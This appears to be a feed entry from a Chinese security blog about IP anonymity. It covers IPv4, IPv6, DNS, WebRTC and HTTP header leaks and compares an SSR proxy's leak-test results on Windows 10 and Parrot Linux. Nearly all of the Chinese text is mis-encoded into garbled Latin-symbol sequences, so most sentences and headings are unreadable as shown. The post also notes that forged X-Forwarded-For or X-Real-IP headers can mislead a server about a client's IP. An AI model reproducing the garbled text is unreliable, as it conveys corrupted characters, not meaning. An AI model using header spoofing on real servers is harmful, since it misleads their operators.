title="IPV4Ê≥ÑÈú≤"></a>IPV4Ê≥ÑÈú≤</h3><blockquote><p>IPv4‰ΩøÁî®32‰ΩçÔºà4Â≠óËäÇÔºâÂú∞ÂùÄÔºåÂõ†Ê≠§Âú∞ÂùÄÁ©∫Èó¥‰∏≠Âè™Êúâ4,294,967,296Ôºà232Ôºâ‰∏™Âú∞ÂùÄ„ÄÇ‰∏çËøáÔºå‰∏Ä‰∫õÂú∞ÂùÄÊòØ‰∏∫ÁâπÊÆäÁî®ÈÄîÊâÄ‰øùÁïôÁöÑÔºåÂ¶Ç‰∏ìÁî®ÁΩëÁªúÔºàÁ∫¶1800‰∏á‰∏™Âú∞ÂùÄÔºâÂíåÂ§öÊí≠Âú∞ÂùÄÔºàÁ∫¶2.7‰∫ø‰∏™Âú∞ÂùÄÔºâÔºåËøôÂáèÂ∞ë‰∫ÜÂèØÂú®‰∫íËÅîÁΩë‰∏äË∑ØÁî±ÁöÑÂú∞ÂùÄÊï∞Èáè„ÄÇÈöèÁùÄÂú∞ÂùÄ‰∏çÊñ≠Ë¢´ÂàÜÈÖçÁªôÊúÄÁªàÁî®Êà∑ÔºåIPv4Âú∞ÂùÄÊûØÁ´≠ÈóÆÈ¢ò‰πüÂú®Èöè‰πã‰∫ßÁîü„ÄÇÂü∫‰∫éÂàÜÁ±ªÁΩëÁªú„ÄÅÊó†Á±ªÂà´ÂüüÈó¥Ë∑ØÁî±ÂíåÁΩëÁªúÂú∞ÂùÄËΩ¨Êç¢ÁöÑÂú∞ÂùÄÁªìÊûÑÈáçÊûÑÊòæËëóÂú∞ÂáèÂ∞ë‰∫ÜÂú∞ÂùÄÊûØÁ´≠ÁöÑÈÄüÂ∫¶„ÄÇ‰ΩÜÂú®2011Âπ¥2Êúà3Êó•ÔºåÂú®ÊúÄÂêé5‰∏™Âú∞ÂùÄÂùóË¢´ÂàÜÈÖçÁªô5‰∏™Âå∫Âüü‰∫íËÅîÁΩëÊ≥®ÂÜåÁÆ°ÁêÜÊú∫ÊûÑ‰πãÂêéÔºåIANAÁöÑ‰∏ªË¶ÅÂú∞ÂùÄÊ±†Â∑≤ÁªèÁî®Â∞Ω„ÄÇ</p></blockquote><p>Êàë‰ª¨Áé∞Âú®Â∏∏ËØ¥ÁöÑIPÂú∞ÂùÄÂ∞±ÊòØÊåáIPV4Âú∞ÂùÄÔºåÈÄöÂ∏∏Êàë‰ª¨Âú®‰ΩøÁî®ÊµèËßàÂô®ËÆøÈóÆwebÁ´ôÁÇπÊó∂ÔºåËØ∑Ê±ÇÂ§¥‰∏≠‰ºöÂåÖÂê´Êàë‰ª¨ÁöÑIPV4Âú∞ÂùÄÔºåÂõ†Ê≠§ÂèØ‰ª•Ë¢´ÊúçÂä°Âô®Ëé∑ÂèñÂà∞Êàë‰ª¨ÁöÑIPÂπ∂ËÆ∞ÂΩïËøõÂÖ•Êó•Âøó„ÄÇ</p><h3 id="IPV6Ê≥ÑÈú≤"><a href="#IPV6Ê≥ÑÈú≤" class="headerlink" title="IPV6Ê≥ÑÈú≤"></a>IPV6Ê≥ÑÈú≤</h3><blockquote><p>InternetÂçèËÆÆÁâàÊú¨6ÔºàIPv6ÔºâÊòØInternetÂçèËÆÆÔºàIPÔºâÁöÑÊúÄÊñ∞ÁâàÊú¨ÔºåIPÂçèËÆÆÊòØ‰∏∫ÁΩëÁªú‰∏äÁöÑËÆ°ÁÆóÊú∫Êèê‰æõÊ†áËØÜÂíåÂÆö‰ΩçÁ≥ªÁªüÂπ∂ÈÄöËøáInternetË∑ØÁî±ÊµÅÈáèÁöÑÈÄö‰ø°ÂçèËÆÆ„ÄÇIPv6ÊòØÁî±‰∫íËÅîÁΩëÂ∑•Á®ã‰ªªÂä°ÁªÑÔºàIETFÔºâÂºÄÂèëÁöÑÔºåÁî®‰∫éËß£ÂÜ≥ÈïøÊúü‰ª•Êù•ÁöÑIPv4Âú∞ÂùÄËÄóÂ∞ΩÈóÆÈ¢ò„ÄÇ</p><p>Èô§‰∫ÜÊõ¥Â§ßÁöÑÂØªÂùÄÁ©∫Èó¥‰πãÂ§ñÔºåIPv6ËøòÊèê‰æõÂÖ∂‰ªñÊäÄÊúØ‰ºòÂäø„ÄÇÁâπÂà´ÊòØÔºåÂÆÉÂÖÅËÆ∏ÂàÜÂ±ÇÂú∞ÂùÄÂàÜÈÖçÊñπÊ≥ïÔºåËøô‰∫õÊñπÊ≥ïÊúâÂä©‰∫éË∑®InternetÁöÑ<a href="https://en.wikipedia.org/wiki/Route_aggregation" target="_blank" rel="noopener">Ë∑ØÁî±ËÅöÂêà</a>Ôºå‰ªéËÄåÈôêÂà∂‰∫Ü<a href="https://en.wikipedia.org/wiki/Routing_table" target="_blank" rel="noopener">Ë∑ØÁî±Ë°®</a>ÁöÑÊâ©Â±ï„ÄÇÊâ©Â±ïÂíåÁÆÄÂåñ‰∫ÜÂ§öÊí≠ÂØªÂùÄÁöÑ‰ΩøÁî®ÔºåÂπ∂‰∏∫ÊúçÂä°ÁöÑÊèê‰æõÊèê‰æõ‰∫ÜÈ¢ùÂ§ñÁöÑ‰ºòÂåñ„ÄÇÂú®ÂçèËÆÆÁöÑËÆæËÆ°‰∏≠Â∑≤ÁªèËÄÉËôë‰∫ÜËÆæÂ§áÁßªÂä®ÊÄßÔºåÂÆâÂÖ®ÊÄßÂíåÈÖçÁΩÆÊñπÈù¢„ÄÇ</p><p>IPv6Âú∞ÂùÄË°®Á§∫‰∏∫ÂÖ´ÁªÑÔºåÊØèÁªÑÂõõ‰∏™<a href="https://en.wikipedia.org/wiki/Hexadecimal" target="_blank" rel="noopener">ÂçÅÂÖ≠ËøõÂà∂</a>Êï∞Â≠óÔºåÁªÑ‰ª•ÂÜíÂè∑ÂàÜÈöîÔºå‰æãÂ¶Ç2001Ôºö0db8Ôºö0000Ôºö0042Ôºö0000Ôºö8a2eÔºö0370Ôºö7334Ôºå‰ΩÜÂ≠òÂú®Áº©ÂÜôÊ≠§ÂÆåÊï¥Á¨¶Âè∑ÁöÑÊñπÊ≥ï„ÄÇ</p></blockquote><p>IPV6ÊòØËøòÊú™ÊôÆÈÅç‰ΩøÁî®ÁöÑ‰∏ÄÁßçÂú∞ÂùÄÔºåÁî®‰∫éËß£ÂÜ≥ÈïøÊúü‰ª•Êù•ÁöÑIPv4Âú∞ÂùÄËÄóÂ∞ΩÈóÆÈ¢òÔºåÈÄöËøáÊ≤°ÊúâÈöêËóèIPV6‰πü‰ºöÊ≥ÑÈú≤Êàë‰ª¨‰ø°ÊÅØ„ÄÇ</p><h3 id="DNSÊ≥ÑÈú≤"><a href="#DNSÊ≥ÑÈú≤" class="headerlink" title="DNSÊ≥ÑÈú≤"></a>DNSÊ≥ÑÈú≤</h3><p>‰ªÄ‰πàÊòØDNS?</p><blockquote><p>DNSÊàñÂüüÂêçÁ≥ªÁªüÁî®‰∫éÂ∞ÜÂüüÂêçÔºàÂ¶Ç<a href="http://www.astrill.comÔºâËΩ¨Êç¢‰∏∫Êï∞Â≠óIPÂú∞ÂùÄÔºå‰æãÂ¶Ç" target="_blank" rel="noopener">www.astrill.comÔºâËΩ¨Êç¢‰∏∫Êï∞Â≠óIPÂú∞ÂùÄÔºå‰æãÂ¶Ç</a> 123.98.12.1Âú®‰∫íËÅîÁΩë‰∏äÁî®‰∫éÂèëÈÄÅÊï∞ÊçÆÂåÖ„ÄÇ ÊØèÂΩìÊÇ®ÁöÑËÆ°ÁÆóÊú∫ÈúÄË¶ÅËÅîÁ≥ªÁΩëÁªú‰∏äÁöÑÊúçÂä°Âô®Êó∂Ôºå‰æãÂ¶ÇÂΩìÊÇ®Âú®ÊµèËßàÂô®‰∏≠ËæìÂÖ•URLÊó∂ÔºåÊÇ®ÁöÑËÆ°ÁÆóÊú∫‰ºöËÅîÁ≥ªDNSÊúçÂä°Âô®Âπ∂ËØ∑Ê±ÇIPÂú∞ÂùÄ„ÄÇÂ§ßÂ§öÊï∞‰∫íËÅîÁΩëÊúçÂä°Êèê‰æõÂïÜ‰∏∫‰ªñ‰ª¨ÁöÑÂÆ¢Êà∑ÂàÜÈÖç‰∏Ä‰∏™DNSÊúçÂä°Âô®ÔºåÂÆÉ‰ª¨Áî®‰∫éÊéßÂà∂ÂíåËÆ∞ÂΩïÊÇ®ÁöÑ‰∫íËÅîÁΩëÊ¥ªÂä®„ÄÇ</p></blockquote><p>Âú®Êüê‰∫õÊÉÖÂÜµ‰∏ãÔºåÂç≥‰ΩøËøûÊé•Âà∞ÂåøÂêçÁΩëÁªúÔºåÊìç‰ΩúÁ≥ªÁªü‰ªçÂ∞ÜÁªßÁª≠‰ΩøÁî®ÂÖ∂ÈªòËÆ§DNSÊúçÂä°Âô®ÔºåËÄå‰∏çÊòØÁî±ÂåøÂêçÁΩëÁªúÂàÜÈÖçÁªôÊÇ®ËÆ°ÁÆóÊú∫ÁöÑÂåøÂêçDNSÊúçÂä°Âô®„ÄÇËøôË¢´Áß∞‰∏∫Ê≥ÑÊºè„ÄÇDNSÊ≥ÑÊºèÊòØ‰∏ªË¶ÅÁöÑÈöêÁßÅÂ®ÅËÉÅÔºåÂõ†‰∏∫ÂåøÂêçÁΩëÁªúÂèØËÉΩ‰ºöÂú®ÁßÅ‰∫∫Êï∞ÊçÆÊ≥ÑÈú≤ÁöÑÂêåÊó∂Êèê‰æõÈîôËØØÁöÑÂÆâÂÖ®ÊÑü„ÄÇ</p><p>ÂΩìÊÇ®ÁöÑDNSËØ∑Ê±ÇË¢´Ê≥ÑÈú≤Êó∂ÔºåÂèëÈÄÅÂà∞/‰ªéÁΩëÁ´ôÂèëÈÄÅÁöÑÂÆûÈôÖÊï∞ÊçÆÂ∞Ü‰∏çË¢´ÊçïËé∑„ÄÇ‰ΩÜÂÆÉ‰ªçÁÑ∂ÂèØ‰ª•ÂêëÁ™ÉÂê¨ËÄÖÊèê‰æõÂÖ≥‰∫éÊÇ®ËÆøÈóÆÁöÑÁΩëÁ´ôÁöÑË∂≥Â§ü‰ø°ÊÅØ„ÄÇÂÆÉ‰πü‰∏∫DNSÁóÖÊØíÊâìÂºÄÈó®Êà∑ÔºåÂèØÁî®‰∫éÈíìÈ±ºÊîªÂáª(DNSÂä´ÊåÅ)„ÄÇ</p><h3 id="WEBRTCÊ≥ÑÈú≤"><a href="#WEBRTCÊ≥ÑÈú≤" class="headerlink" title="WEBRTCÊ≥ÑÈú≤"></a>WEBRTCÊ≥ÑÈú≤</h3><blockquote><p>‰ªÄ‰πàÊòØWEBRTCÔºü</p><p>WebRTCÔºàWeb Real-Time CommunicationÔºâÊòØ‰∏Ä‰∏™ÊîØÊåÅÁΩëÈ°µÊµèËßàÂô®ËøõË°åÂÆûÊó∂ËØ≠Èü≥ÂØπËØùÊàñËßÜÈ¢ëÂØπËØùÁöÑÊäÄÊúØÔºåÊòØË∞∑Ê≠å2010Âπ¥‰ª•6820‰∏áÁæéÂÖÉÊî∂Ë¥≠Global IP SolutionsÂÖ¨Âè∏ËÄåËé∑ÂæóÁöÑ‰∏ÄÈ°πÊäÄÊúØ„ÄÇ2011Âπ¥5ÊúàË∞∑Ê≠åÂºÄÊîæ‰∫ÜWebRTCÁöÑÊ∫ê‰ª£Á†ÅÔºåÂú®Ë°å‰∏öÂÜÖÂæóÂà∞‰∫ÜÂπøÊ≥õÁöÑÊîØÊåÅÂíåÂ∫îÁî®„ÄÇ</p></blockquote><p>Âç≥‰ΩøÊÇ®Ê≠£Âú®‰ΩøÁî® VPNÔºå‰πü‰ºöÂá∫Áé∞Â§ö‰∏™ÂèØ‰ª•Ê≥ÑÊºè IP Âú∞ÂùÄÁöÑ‚ÄúÊÑèÊÉ≥‰∏çÂà∞ÁöÑÈîôËØØ‚Äù„ÄÇÂÆÉË¢´Áß∞‰∏∫ WebRTCÔºàWeb ÂÆûÊó∂ÈÄö‰ø°ÔºâÊ≥ÑÊºè„ÄÇ</p><p>WebRTC ÂÖÅËÆ∏ÊµèËßàÂô®ÂÜÖÈÉ®ÁöÑÂÆûÊó∂ÈÄö‰ø°„ÄÇËøôÂæàÊñπ‰æøÔºå‰ΩÜ‰πüÊúâ‰∏Ä‰∏™Áº∫ÁÇπ„ÄÇÂç≥‰ΩøÊâìÂºÄ‰∫ÜVPNÔºåWebRTC ‰πüËÉΩÈªòËÆ§Ê≥ÑÊºèÊÇ®ÁöÑÁúüÂÆûÂú∞ÂùÄ„ÄÇWebRTC ÂçèËÆÆÈÄöËøáËÆæËÆ°ÂÆûÁé∞Ê≠§ÁõÆÁöÑÔºåÂç≥‰ΩøÊòØÊúÄÂ•ΩÁöÑ VPN ‰πüÊó†Ê≥ïÂßãÁªà‰øùÊä§Ëá™Â∑±ÁöÑ‰ø°ÊÅØ‰∏çË¢´Ê≥ÑÈú≤„ÄÇ</p><p>Âõ†Ê≠§ÔºåÂ¶ÇÊûú‰ΩøÁî®ÈªòËÆ§ÂêØÁî® WebRTC ÁöÑÊµèËßàÂô®ÔºåÂàôÈááÂèñÂøÖË¶ÅÁöÑÈ¢ÑÈò≤Êé™ÊñΩËøô‰∏ÄÁÇπÂçÅÂàÜÈáçË¶Å„ÄÇÂú®ÈÄâÊã©ÁöÑÊµèËßàÂô®‰∏≠ÊêúÁ¥¢Â¶Ç‰ΩïÂÖ≥Èó≠ WebRTCÔºåÊàñÊü•ÊâæÊòØÂê¶Â≠òÂú®ÂèØÂÆâË£ÖÁî®Êù•Á¶ÅÁî® WebRTC ÁöÑ WebRTC ÈòªÊ≠¢Êèí‰ª∂„ÄÇËØ∑ËÆ∞‰ΩèÔºåÁ¶ÅÁî® WebRTC ÂèØËÉΩ‰ºöÂØºËá¥ÈÉ®ÂàÜÁΩëÁ´ôÔºàÂ¶Ç Google HangoutsÔºâÊó†Ê≥ïÊ≠£Â∏∏Â∑•‰ΩúÔºåÂõ†Ê≠§ÊÇ®ÂèØËÉΩÈúÄË¶ÅÂú®ÁâπÂÆöÊÉÖÂÜµ‰∏ãÂêØÁî®ÂÆÉ„ÄÇ</p><pre class=" language-payload"><code class="language-payload">FirefoxÊµèËßàÂô®Á¶ÅÁî®WebRTCÁöÑÊñπÊ≥ïÊòØÔºöÂú®ÊµèËßàÂô®‰∏äËæìÂÖ•Ôºöabout:config„ÄÇ‰πãÂêéÊêúÁ¥¢Ôºömedia.peerconnection.enabled„ÄÇÊâæÂà∞ÂÆÉÂêéÂèåÂáªÔºåÂ∞ÜÂÖ∂ÊîπÊàê false Âç≥ÂèØ„ÄÇChromeÊµèËßàÂô®Á¶ÅÁî®WebRTCÁöÑÊñπÊ≥ïÊòØÔºöÂú®ChromeÂ∫îÁî®ÂïÜÂ∫óÈáåÔºåÂÆâË£Ö‰∏Ä‰∏™Âêç‰∏∫WebRTC Leak PreventÁöÑÊâ©Â±ïÔºåÁÑ∂ÂêéÈÄâÊã© Use my Porxy server(if present) Âç≥ÂèØ„ÄÇ</code></pre><h3 id="HTTPheaderÊ≥ÑÈú≤"><a href="#HTTPheaderÊ≥ÑÈú≤" class="headerlink" title="HTTPheaderÊ≥ÑÈú≤"></a>HTTPheaderÊ≥ÑÈú≤</h3><p>httpËØ∑Ê±ÇÊï∞ÊçÆÂåÖ‰∏≠ÁöÑ<code>header</code>:</p><pre class=" language-html"><code class="language-html">GET / HTTP/1.1Host: www.4399.comConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh,en-US;q=0.9,en;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6Cookie: home4399=yes; UM_distinctid=169050f7793431-0062d73fb17ef-b79183d-144000-169050f7794319; CNZZDATA30039538=cnzz_eid%3D1853484585-1550564275-%26ntime%3D1550564275If-None-Match: W/"5c6b5dba-2a86c"If-Modified-Since: Tue, 19 Feb 2019 01:36:58 GMT</code></pre><p>ÂèØËßÅÔºåÈÄöËøá<code>header</code>‰∏≠ÁöÑ<code>Accept-Language</code>,<code>User-Agent</code>Ê≥ÑÈú≤‰∫Ü‰∏Ä‰∫õ‰ø°ÊÅØÔºåÂ¶ÇÔºöÊàë‰ª¨‰ΩøÁî®ÁöÑÊòØ‰∏≠ÊñáÂíåËã±ÊñáÔºåÁî®Êà∑ËØ¶ÁªÜUA‰ø°ÊÅØÁ≠âÁ≠â„ÄÇ</p><p>‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÊàë‰ª¨‰πüÂèØ‰ª•‰ΩøÁî®<code>X-Forwarded-For</code>,<code>X-Client-IP</code>,<code>X-Real-IP</code>,<code>X-Remote-IP</code>Á≠âËØ∑Ê±ÇÂ±ûÊÄß‰º™ÈÄ†IP‰ªéËÄåÈ™óËøáÊúçÂä°Âô®ÁöÑIPËØÜÂà´„ÄÇ</p><h2 id="IPÂåøÂêçÊÄßÊµãËØï"><a href="#IPÂåøÂêçÊÄßÊµãËØï" class="headerlink" title="IPÂåøÂêçÊÄßÊµãËØï"></a>IPÂåøÂêçÊÄßÊµãËØï</h2><p>Êàë‰ª¨Êé•‰∏ãÊù•Âü∫‰∫éwindows10Âíåparrot linuxÂπ≥Âè∞‰ª£ÁêÜËøõË°åIPÂåøÂêçÊÄßÊµãËØïÔºå‰ª£ÁêÜËΩØ‰ª∂ÊòØÊúÄÊôÆÈÄöÁöÑ<code>Â∞èÈ£ûÊú∫(ssr)</code>ÔºåÂÄºÂæó‰∏ÄÊèêÁöÑÊòØ<code>ElectronÁâàÂ∞èÈ£ûÊú∫</code>Ëøò‰∏çÈîôÔºåË∑®Âπ≥Âè∞„ÄÇ</p><blockquote><p>‰ªÄ‰πàÊòØParrot linux?</p><p>Parrot Security OSÔºàÁÆÄÁß∞‰Ωú„ÄåParrorSec„ÄçÊàñ„ÄåParrotÔºàÈπ¶ÈπâÔºâ„ÄçÔºâÊòØ‰∏Ä‰∏™Âü∫‰∫é Debian Èù¢ÂêëÂÆâÂÖ®ÁöÑ GNU/<a href="https://www.linuxprobe.com/" target="_blank" rel="noopener">Linux</a> ÂèëË°åÁâà„ÄÇÂÆÉÊèê‰æõ‰∫ÜËØ∏Â§öÁî®‰∫éÂÆâÂÖ®ÊµãËØï„ÄÅÊï∞Â≠óÂèñËØÅ„ÄÅËΩØ‰ª∂ÂºÄÂèëÂèäÈöêÁßÅÈò≤Êä§ÁöÑ‰∏ì‰∏öÂ∑•ÂÖ∑„ÄÇ</p><p>Parrot‰∏ékaliÁ±ª‰ººÔºå‰ΩÜÊØîkaliÂ§öÂæàÂ§öÂ∑•ÂÖ∑„ÄÇÂú®ÊàëÁõÆÂâç‰ΩøÁî®ÁöÑÊÉÖÂÜµÁúãÊù•ÔºåÂêåÁ≠âÈÖçÁΩÆ‰∏ãParrotË¶ÅÊØîkaliÁæéËßÇÊµÅÁïÖ„ÄÇ</p></blockquote><p>‰ΩøÁî®‰ª•‰∏ã‰∏â‰∏™ÁΩëÂùÄËøõË°åÂåøÂêçÊÄßÊ£ÄÊµãÔºö    </p><ul><li><a href="https://www.astrill.com/zh/vpn-leak-test" target="_blank" rel="noopener">https://www.astrill.com/zh/vpn-leak-test</a></li><li><a href="https://whoer.net/zh" target="_blank" rel="noopener">https://whoer.net/zh</a></li><li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li></ul><p>ÈÄöËøáÊµãËØïÁõ¥ËßÇÂú∞ÊòæÁé∞Âá∫‰∏çÂêåÂπ≥Âè∞Ôºå‰∏çÂêåÊÉÖÂÜµ‰∏ãÁöÑÂåøÂêçÁ®ãÂ∫¶Ôºå‰ªéËÄåÂæóÂà∞ÂÖ∂Â∑ÆÂà´„ÄÇ</p><h3 id="Windows-10Âπ≥Âè∞"><a href="#Windows-10Âπ≥Âè∞" class="headerlink" title="Windows 10Âπ≥Âè∞"></a>Windows 10Âπ≥Âè∞</h3><p>Âú®ÊàëÁöÑÁâ©ÁêÜÊú∫<code>windows 10</code>Êú¨Âú∞ÂêØÁî®<code>Â∞èÈ£ûÊú∫</code>‰πãÂêéÔºåÊàë‰ª¨ÂàÜÂà´‰ªéÂá†‰∏™ÊµãËØïÂπ≥Âè∞Ëé∑Âæó‰∫ÜIPÂåøÂêçÊÄßÊµãËØïÁªìÊûúÔºö</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200332.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200512.png" alt=""></p><p><code>ceye.io</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219193744.png" alt=""></p><p>ÈÄöËøá‰º™ÈÄ†httpheader‰∏≠ÁöÑ<code>x-real-ip</code>Êàë‰ª¨ÂèØ‰ª•ÁªôËá™Â∑±Âä†‰∏ä‰∏ÄÂ±Ç‰º™Ë£ÖÔºå‰ΩÜÊòØÂπ∂‰∏çËÉΩÈÄÉËøáÊ£ÄÊµãÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219194704.png" alt=""></p><p>Áî±‰ª•‰∏ä‰∏â‰∏™ÁªìÊûúÂèØ‰ª•‰∫ÜËß£Âà∞ÔºåÂçïÁ∫ØÂú®win10‰∏ä‰ΩøÁî®Â∞èÈ£ûÊú∫‰ª£ÁêÜÊó∂ÔºåastrillÂíåwhoerÂπ≥Âè∞ÁöÑÁªìÊûúÂÖ±ÂêåÂèçÊò†Âá∫‰∫ÜDNSÂíåWEBRTCÁöÑÊ≥ÑÈú≤Ôºå‰ª•ÂèäÈ°µÈù¢ËØ≠Ë®ÄÔºåÂΩìÂú∞Êó∂Èó¥Á≠â‰ø°ÊÅØ„ÄÇËÄåceyeÁöÑÁªìÊûúÊõ¥ÊòØÁõ¥Êé•ÂæóÂà∞‰∫ÜÊàë‰ª¨ÁöÑÁúüÂÆûIPÔºå‰ªÖÂá≠‰∏äËø∞‰ø°ÊÅØÂ∑≤ÁªèÂèØ‰ª•Á≤æÁ°ÆÁü•ÈÅìÊàëÊòØÂì™‰∏™ÊùëÁöÑ‰∫∫‰∫Ü(ÂºÄ‰∏™Áé©Á¨ëhhh)ÔºåÂõ†Ê≠§Âú®win10‰∏äÂ∞èÈ£ûÊú∫ÁöÑÂåøÂêçÊÄßÂ†™Âøß„ÄÇ</p><h3 id="Parrot-LinuxÂπ≥Âè∞"><a href="#Parrot-LinuxÂπ≥Âè∞" class="headerlink" title="Parrot LinuxÂπ≥Âè∞"></a>Parrot LinuxÂπ≥Âè∞</h3><p>Âú®ÊàëÁöÑËôöÊãüÊú∫<code>Parrot Linux</code>ÂêØÁî®<code>Â∞èÈ£ûÊú∫</code>‰πãÂêéÔºåÊàë‰ª¨ÂàÜÂà´‰ªéÂá†‰∏™ÊµãËØïÂπ≥Âè∞Ëé∑Âæó‰∫ÜIPÂåøÂêçÊÄßÊµãËØïÁªìÊûúÔºö</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195503.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195626.png" class="lazyload"></p><p><code>ceye.io</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195409.png" class="lazyload"></p><p>Áî±‰ª•‰∏ä‰∏â‰∏™ÁªìÊûúÂèØ‰ª•ÁúãÂà∞ÔºåÊ≤°ÊúâÂá∫Áé∞‰∏éÊàëÊâÄÂú®Âú∞ÊúâÂÖ≥ÁöÑ‰ø°ÊÅØÔºåÊ£ÄÊµãÂà∞ÁöÑIP‰πü‰∏çÊòØÊàëÁöÑÁúüÂÆûIP(117.170.**<em>.\</em>**)ÔºåËÄåÊòØ‰ª£ÁêÜÊúçÂä°Âô®ÁöÑIPÂú∞ÂùÄÔºåÊ≤°ÊúâÂá∫Áé∞DNSÂíåWEBRTCÊ≥ÑÈú≤ÔºåÂõ†ËÄåÂèØ‰ª•ÁúãÂá∫<code>Parrot linux</code>‰Ωú‰∏∫‰∏Ä‰∏™Èù¢ÂêëÂÆâÂÖ®ÊµãËØïÁöÑlinuxÂèëË°åÁâàÁöÑÂåøÂêçÊÄßÊòØÂçÅÂàÜ‰πãÈ´òÁöÑÔºåÁõ∏ÂØπ‰∫éwin10ÂåøÂêçÊÄßË¶ÅÊèêÈ´ò‰∫Ü‰∏çÂ∞ë„ÄÇ</p><h3 id="‰ª•Parrot‰Ωú‰∏∫Ë∑≥ÊùøÔºå‰∏∫win10‰ª£ÁêÜ"><a href="#‰ª•Parrot‰Ωú‰∏∫Ë∑≥ÊùøÔºå‰∏∫win10‰ª£ÁêÜ" class="headerlink" title="‰ª•Parrot‰Ωú‰∏∫Ë∑≥ÊùøÔºå‰∏∫win10‰ª£ÁêÜ"></a>‰ª•Parrot‰Ωú‰∏∫Ë∑≥ÊùøÔºå‰∏∫win10‰ª£ÁêÜ</h3><p>Êó¢ÁÑ∂ParrotÁöÑÂåøÂêçÊÄßÊØîËæÉÂ•ΩÔºåÈÇ£Êàë‰ª¨Êääparrot‰Ωú‰∏∫Ë∑≥ÊùøÔºàparrot‰∏äÁöÑÂ∞èÈ£ûÊú∫ÂÖÅËÆ∏Â±ÄÂüüÁΩëËøûÊé•ÔºâÔºåÁî®win10ËøûÊé•ËøêË°åÂú®parrot‰∏äÁöÑÂ∞èÈ£ûÊú∫‰ª£ÁêÜÔºå‰ºöÊúâ‰ªÄ‰πàÁªìÊûúÂë¢Ôºü</p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219201252.png" class="lazyload"></p><p>ceye.ioÂíåastrillÊ£ÄÊµãÊòØÊ≠£Â∏∏ÁöÑÔºåÊ≤°ÊúâÊ≥ÑÈú≤‰ø°ÊÅØÔºå‰ΩÜÊòØ‰ªéwhoer.netÁöÑÁªìÊûúÁúãÊù•ÔºöÊ≥ÑÈú≤‰∫ÜÊó∂Âå∫ÔºåËØ≠Ë®ÄÁ≠â‰ø°ÊÅØ„ÄÇÊúÄÂÖ≥ÈîÆÁöÑÊòØWEBRTCÁõ¥Êé•Ê≥ÑÈú≤Âá∫‰∫ÜÊàë‰ª¨ÁöÑÁúüÂÆûIPÂú∞ÂùÄÂíåÂÜÖÁΩëÂú∞ÂùÄ„ÄÇ</p><blockquote><p>Parrot OS‰∏≠Ëá™Â∏¶TorÁΩëÁªúÔºåÂíåÂåøÂêçÊ®°ÂºèÔºå‰ª•‰∏äÊµãËØïÂùáÂú®Êú™ÂºÄÂêØTorÁΩëÁªúÂíåÂåøÂêçÊ®°ÂºèÊÉÖÂÜµ‰∏ãÊµãËØï„ÄÇ</p><p>ÊÄªÁöÑÊù•ËØ¥ÔºåÂçïÁ∫ØÂú∞‰ΩøÁî®ParrotËøòÊòØÂæàÈ¶ôÂæàÂåøÂêçÁöÑÔºÅ</p></blockquote><h2 id="ÊÄùËÄÉ"><a href="#ÊÄùËÄÉ" class="headerlink" title="ÊÄùËÄÉ"></a>ÊÄùËÄÉ</h2><p>ÂΩì‰ªäÁöÑÁßëÊäÄÂèëÂ±ïËøÖÈÄüÔºåÈöêÁßÅ‰ø°ÊÅØ‰πüÊòæÂæóË∂äÊù•Ë∂äÈáçË¶ÅÔºåÈÄöËøá‰∏ÄÈÉ®ÂàÜÁúüÂÆûÁöÑËõõ‰∏ùÈ©¨ËøπÔºåÂ∞±ÂèØËÉΩËøòÂéüÂá∫Á≤æÂáÜÁöÑ‰ø°ÊÅØÊ®°Âûã„ÄÇIPV6Ê≥ÑÈú≤ÔºåDNSÊ≥ÑÈú≤ÔºåWEBRTCÊ≥ÑÈú≤ÔºåHTTPheaderÊ≥ÑÈú≤ÈÉΩÂèØËÉΩÂØºËá¥‰Ω†Âú®ÁΩëÁªú‰∏äÁöÑÂåøÂêçÊÄßÈôç‰ΩéÔºåÂèØËÉΩÂØπ‰∫éÊôÆÈÄö‰∫∫Êù•ËØ¥ÔºåËøôÂè™ÊòØÊó†ÂÖ≥Á¥ßË¶ÅÁöÑ‰∫ãÊÉÖÔºå‰ΩÜÂØπ‰∫éËØ∏‰ΩçÂÆâÂÖ®‰ªé‰∏öËÄÖÊù•ËØ¥ÔºåÂÖ∂‰∏≠Âà©Âºä‰∏çÁî®Â§öË®Ä„ÄÇ</p><blockquote><p>Ê≥®Êòé: <a href="https://mp.weixin.qq.com/s/Otk44j7UNbT_FX9mXq6o4Q" target="_blank" rel="noopener">Ê≠§ÊñáÁ´†È¶ñÂèë‰∫éÂÆâÊÅíÁΩëÁªúÁ©∫Èó¥ÂÆâÂÖ®ËÆ≤Ê≠¶Â†ÇÂÖ¨‰ºóÂè∑</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity&lt;/p&gt;
    
    </summary>
    
      <category term="ÁΩëÁªúÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ÁΩëÁªúÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="IPÂåøÂêçÊÄß" scheme="http://www.yof3ng.xyz/tags/IP%E5%8C%BF%E5%90%8D%E6%80%A7/"/>
    
